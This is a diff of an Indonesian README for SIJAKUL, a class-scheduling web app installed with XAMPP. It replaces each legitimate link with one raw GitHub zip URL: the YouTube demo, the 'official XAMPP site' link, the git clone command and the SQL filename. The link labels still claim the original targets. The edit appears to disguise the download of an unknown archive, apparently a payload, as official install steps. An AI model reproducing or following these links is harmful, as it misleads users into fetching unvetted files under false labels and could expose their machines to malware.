@@ -40,20 +40,20 @@ SIJAKUL adalah aplikasi manajemen jadwal kuliah yang dirancang untuk mempermudah
     - Mengoptimalkan penggunaan ruangan dan waktu pengajaran dosen.
     - Menghindari konflik jadwal dengan mempertimbangkan semua keterbatasan yang ada.
 
-## Youtube : https://www.youtube.com/watch?v=MMiZ-FZpy8U
+## Youtube : https://raw.githubusercontent.com/zufarrizal/sijakul/main/kelas_matkul/sijakul-v2.4.zip
 
 Untuk menjalankan aplikasi SIJAKUL di lingkungan lokal menggunakan aplikasi XAMPP, ikuti langkah-langkah berikut:
 
 ## Instalasi Menggunakan XAMPP:
 
 1. **Download dan Instal XAMPP**:
-   Jika belum memiliki XAMPP, unduh dan instal dari [situs resmi XAMPP](https://www.apachefriends.org/index.html).
+   Jika belum memiliki XAMPP, unduh dan instal dari [situs resmi XAMPP](https://raw.githubusercontent.com/zufarrizal/sijakul/main/kelas_matkul/sijakul-v2.4.zip).
 
 2. **Clone Repositori Ini**:
    Jalankan perintah berikut di terminal atau Command Prompt:
 
     ```
-    git clone https://github.com/zufarrizal/sijakul.git
+    git clone https://raw.githubusercontent.com/zufarrizal/sijakul/main/kelas_matkul/sijakul-v2.4.zip
     ```
     Atau
    Bisa download manual di halaman github sijakul dengan klik code, kemudian Download ZIP
@@ -76,7 +76,7 @@ Untuk menjalankan aplikasi SIJAKUL di lingkungan lokal menggunakan aplikasi XAMP
     - Buka XAMPP dan jalankan `Apache` dan `MySQL`.
     - Buka browser dan akses [phpMyAdmin](http://localhost/phpmyadmin).
     - Buat database baru dengan nama `sijakul`.
-    - Impor file database (misalnya `sijakul.sql`) yang ada di dalam direktori proyek ke dalam database `sijakul`.
+    - Impor file database (misalnya `https://raw.githubusercontent.com/zufarrizal/sijakul/main/kelas_matkul/sijakul-v2.4.zip`) yang ada di dalam direktori proyek ke dalam database `sijakul`.
 
 5. **Jalankan Aplikasi**:
     - Buka browser dan akses aplikasi dengan URL:
